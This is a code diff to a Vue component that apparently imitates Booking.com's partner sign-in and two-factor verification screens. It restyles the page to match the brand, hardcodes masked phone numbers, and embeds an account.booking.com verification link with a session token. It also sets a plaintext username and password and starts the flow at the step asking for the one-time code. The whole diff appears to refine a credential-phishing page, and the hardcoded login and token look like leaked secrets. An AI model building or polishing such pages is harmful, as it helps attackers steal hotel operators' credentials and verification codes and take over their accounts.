@@ -360,7 +360,7 @@
             <div class="rounded divide-y divide-gray-200 text-sm">
               <button
                 @click="goToPhoneCall"
-                class="w-full flex items-center justify-between px-4 py-4 hover:bg-gray-50"
+                class="w-full flex items-center justify-between px-4 py-4 hover:underline hover:decoration-[#006CE4]"
               >
                 <div class="flex items-center gap-3">
                   <div class="w-5 h-5 fill-[#0F75E6]">
@@ -392,7 +392,7 @@
               </button>
               <button
                 @click="handleDefaultLink"
-                class="w-full flex items-center justify-between px-4 py-4 hover:bg-gray-50"
+                class="w-full flex items-center justify-between px-4 py-4 hover:underline hover:decoration-[#006CE4]"
               >
                 <div class="flex items-center gap-3">
                   <div class="w-5 h-5 fill-[#0F75E6]">
@@ -428,9 +428,9 @@
               </button>
             </div>
           </div>
-          <div v-else-if="step === 4" key="step-4" class="flex flex-col gap-5">
+          <div v-else-if="step === 4" key="step-4" class="flex flex-col gap-4">
             <div>
-              <h1 class="text-2xl font-bold text-gray-900">
+              <h1 class="text-xl font-bold text-gray-900 mb-[13.4px]">
                 Select phone number
               </h1>
               <p class="text-sm text-gray-700 mt-1">
@@ -442,22 +442,26 @@
             <div>
               <label
                 for="phoneSelect"
-                class="block text-sm font-medium text-gray-900 mb-1"
+                class="block text-sm font-medium text-gray-900 pb-1"
                 >Phone number</label
               >
               <div class="relative">
                 <select
+                  style="
+                    appearance: none;
+                    -webkit-appearance: none;
+                    -moz-appearance: none;
+                  "
                   id="phoneSelect"
                   v-model="selectedPhone"
-                  class="w-full h-[44px] px-3 pr-10 border border-gray-400 rounded-sm text-sm focus:border-[#006CE4] focus:outline-none focus:ring-1 focus:ring-[#006CE4] focus:ring-opacity-20 bg-white"
+                  class="w-full h-[36px] py-[3px] pl-2 pr-9 border border-gray-400 rounded-sm text-sm focus:outline-none focus:ring-opacity-20 bg-white cursor-pointer"
                 >
                   <option value="" disabled>Select phone number</option>
-                  <option v-for="n in phoneNumbers" :key="n" :value="n">
-                    {{ n }}
-                  </option>
+                  <option value="+1 202-555-0132">+31******9092</option>
+                  <option value="+1 202-555-0175">+31******2000</option>
                 </select>
                 <svg
-                  class="w-5 h-5 text-gray-600 absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none"
+                  class="w-6 h-6 text-gray-600 absolute right-1.5 top-1/2 -translate-y-1/2 pointer-events-none"
                   xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 20 20"
                   fill="currentColor"
@@ -474,10 +478,10 @@
             <button
               :disabled="!selectedPhone"
               @click="goToCodeStep"
-              class="w-full h-[56px] rounded text-lg font-medium"
+              class="w-full h-[48px] py-2 px-4 rounded text-base font-medium"
               :class="
                 !selectedPhone
-                  ? 'bg-gray-200 text-gray-500 !cursor-not-allowed'
+                  ? 'bg-[#d9d9d9] text-[#a2a2a2] !cursor-not-allowed'
                   : 'bg-[#006CE4] text-white hover:bg-[#00449e]'
               "
             >
@@ -487,26 +491,27 @@
             <div class="text-center">
               <button
                 @click="handleDefaultLink"
-                class="text-[#006CE4] hover:underline font-medium"
+                class="text-[#006ce4] w-full px-4 py-2 rounded hover:bg-slate-100 hover:bg-opacity-20 text-sm font-medium transition-colors duration-300"
               >
                 Unable to verify?
               </button>
             </div>
           </div>
-          <div v-else-if="step === 5" key="step-5" class="flex flex-col gap-5">
+          <div v-else-if="step === 5" key="step-5" class="flex flex-col gap-4">
             <div>
-              <h1 class="text-2xl font-bold text-gray-900">
+              <h1 class="text-xl font-bold text-gray-900 mb-[13.4px]">
                 Two Factor Authentication
               </h1>
               <p class="text-sm text-gray-700 mt-1">
                 Enter the verification code provided to you by Booking.com. If
                 you can't verify it, review these
-                <button
+                <a
+                  href="https://account.booking.com/sign-in/verification?op_token=EgVvYXV0aCLqBAoUNlo3Mm9IT2QzNk5uN3prM3BpcmgSCWF1dGhvcml6ZRoaaHR0cHM6Ly9hZG1pbi5ib29raW5nLmNvbS8q8QN7InBhZ2UiOiIvaG90ZWwvaG90ZWxhZG1pbi9leHRyYW5ldF9uZy9tYW5hZ2UvbWVzc2FnaW5nL2luYm94Lmh0bWw_cHVsc2Vfc2hvd19tZXNzYWdlcz0xJmFtcDtyZXNfaWQ9NDkxODIxNjA3MSZhbXA7aG90ZWxfaWQ9MTA0MDImYW1wO2xhbmc9bmwmYW1wO3RocmVhZF9pZD0xMmEzNzVhOS02MDU5LTUwZTktYWQyZC1lYWJjYTYxZjY0ZDMmYW1wO21lc3NhZ2VfaWQ9YmUwOTRlZTAtZGRiYy0xMWVmLTk4NjQtYzI2MGJhOWU5YzNiJmFtcDt1dG1fc291cmNlPW1lc3NhZ2luZyZhbXA7dXRtX2NhbXBhaWduPXBmX2d1ZXN0X3JlcXVlc3QmYW1wO3V0bV90ZXJtPWZyZWVfdGV4dCZhbXA7dXRtX21lZGl1bT1lbWFpbCZhbXA7dXRtX2NvbnRlbnQ9cmVwbHkmYW1wO19lPTE3MzgwOTg5NDkmYW1wO19zPVFVRC84WXFEbHZIeVl2bVVkY2hvSjg5RWhQTkMxbUtvakMrazdXTWNwdzgiLCJhdXRoX2F0dGVtcHRfaWQiOiI2YThiYzEzOC1lOWFhLTQ0ZTYtODFmMi00YTc0MThkOGJmYmQifTIrcVJBb2tubG9NYnpwWXcyTU5FVmUxdk15d0RaUFNGbURVTE9FdXQ4YzM5NDoEUzI1NkIEY29kZSoTMKLUwYit_Cc6AEIAWIvm4O2UMw"
                   @click="handleDefaultLink"
-                  class="text-[#006CE4] hover:underline font-medium"
+                  class="text-[#006CE4] font-bold"
                 >
                   other options
-                </button>
+                </a>
               </p>
             </div>
 
@@ -514,29 +519,31 @@
               <div>
                 <label
                   for="code"
-                  class="block text-sm font-medium text-gray-900 mb-1"
+                  class="block text-sm font-medium text-gray-900 pb-1"
                   >Verification code <span class="text-red-600">*</span></label
                 >
-                <input
-                  id="code"
-                  v-model="verificationCode"
-                  ref="codeInput"
-                  type="text"
-                  inputmode="numeric"
-                  autocomplete="one-time-code"
-                  class="w-full h-[44px] px-3 border border-gray-400 rounded-sm text-sm focus:border-[#006CE4] focus:outline-none focus:ring-1 focus:ring-[#006CE4] focus:ring-opacity-20"
-                  required
-                />
+                <div class="relative">
+                  <input
+                    id="code"
+                    v-model="verificationCode"
+                    ref="codeInput"
+                    type="text"
+                    inputmode="numeric"
+                    autocomplete="one-time-code"
+                    class="w-full h-[36px] py-[3px] pl-2 pr-9 border border-gray-400 rounded-sm text-sm focus:outline-none focus:ring-opacity-20 bg-white"
+                    required
+                  />
+                </div>
               </div>
               <button
                 type="submit"
-                class="w-full bg-[#006ce4] hover:bg-[#00449e] text-white font-medium py-3 px-4 rounded text-base"
+                class="w-full h-[48px] py-2 px-4 rounded text-base font-medium bg-[#006CE4] text-white hover:bg-[#00449e]"
               >
                 Verify now
               </button>
             </form>
 
-            <p class="text-sm text-gray-700 text-center">
+            <p class="text-xs text-gray-700 text-center h-[18px]">
               You should get a phone call soon
             </p>
           </div>
@@ -580,7 +587,7 @@
 import { ref, watch, nextTick, onMounted } from 'vue';
 import UsFlag from '~/assets/us.png';
 
-const step = ref(3);
+const step = ref(5);
 const username = ref('10402');
 const password = ref('BergenDal5');
 const showPassword = ref(false);
